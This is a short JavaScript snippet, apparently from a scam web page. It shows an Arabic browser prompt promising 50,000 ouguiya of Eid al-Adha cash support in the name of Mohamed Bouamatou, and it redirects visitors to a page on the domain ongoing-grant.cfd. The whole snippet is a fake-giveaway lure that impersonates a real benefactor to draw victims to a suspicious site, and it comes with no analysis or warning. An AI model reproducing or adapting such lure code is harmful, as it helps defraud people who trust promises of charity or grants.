var password = 'سحب الأموال';

password = prompt(
  'تهانينا، أنت مؤهل للحصول على دعم محمد بوعماتو عيد الأضحى النقدي بقيمة 50,000 أوقية. اضغط على موافق للاستلام فورًا.',
  'سحب الأموال'
);

if (password !== 'سحب الأموال') {
    location.href = 'https://ongoing-grant.cfd/Boua-Matou-Um50000.html';
}
